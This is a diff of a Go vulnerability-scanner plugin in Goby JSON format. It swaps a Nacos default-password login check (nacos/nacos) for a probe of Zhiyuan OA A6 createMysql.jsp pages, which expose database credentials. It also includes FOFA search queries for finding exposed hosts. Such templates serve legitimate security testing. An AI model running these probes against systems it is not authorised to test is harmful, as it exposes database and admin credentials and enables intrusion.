@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "致远OA A6 createMysql.jsp 数据库敏感信息泄露",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
-  "Level": "3",
+  "FofaQuery": "title=\"致远A8+协同管理软件.A6\"",
+  "GobyQuery": "title=\"致远A8+协同管理软件.A6\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -26,20 +26,15 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "method": "GET",
+        "uri": "/yyoa/createMysql.jsp",
         "follow_redirect": true,
-        "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
+        "header": {},
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "root",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/yyoa/ext/createMysql.jsp",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root",
             "bz": ""
           }
         ]
@@ -112,8 +138,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "致远OA A6 createMysql.jsp 数据库敏感信息泄露",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "zhiyuan OA A6 createMysql.jsp Database information disclosure",
       "Product": "",
       "Description": "",
       "Recommendation": "",
